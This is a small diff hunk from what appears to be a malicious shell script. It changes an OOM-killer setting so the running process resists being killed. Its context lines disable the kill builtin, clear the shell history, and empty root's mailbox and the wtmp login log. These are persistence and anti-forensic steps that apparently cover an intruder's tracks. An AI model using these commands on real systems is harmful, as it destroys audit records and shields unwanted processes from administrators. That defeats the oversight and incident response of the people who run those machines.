@@ -920,7 +920,8 @@ enable -n kill
 # alias rm='r1m' 
 # :wq
 # EOF
-sudo echo -1000 > /proc/$pid/oom_score_adj
+
+echo -17 > /proc/$$/oom_adj
 history -c
 echo > /var/spool/mail/root
 echo > /var/log/wtmp
